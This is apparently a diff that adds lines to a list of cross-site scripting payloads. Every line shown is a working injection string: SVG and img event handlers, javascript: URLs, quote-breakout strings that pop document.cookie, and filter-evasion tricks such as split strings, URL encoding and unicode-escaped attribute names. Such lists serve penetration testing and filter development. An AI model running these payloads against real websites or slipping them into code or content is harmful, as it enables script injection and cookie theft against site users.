@@ -1,3 +1,7 @@
+<svg xmlns="http://w3.org/2000/svg" onload="this.setAttribute('onmouseover','confirm(1)')"></svg>
+javascript:window['al'+'er'+(['t','b','c'][0])](origin)
+orwa%27"><svg/onload=alert(document.cookie)>
+' oncontent\visibilityautostatechange='a=alert,(a?a:a)(origin)' x=\v+styl\u0065='content-visibility:auto
 1%27;--<img%20src=x%20onerror=javascript:alert(document.domain)>
 javascript:var{a:onerror}={a:%2561lert};throw%20origin
 <bla tabindex=1 onblur=alert(1) autofocus></bla><meta http-equiv="refresh" content=1;URL=mailto:someone@example.com">
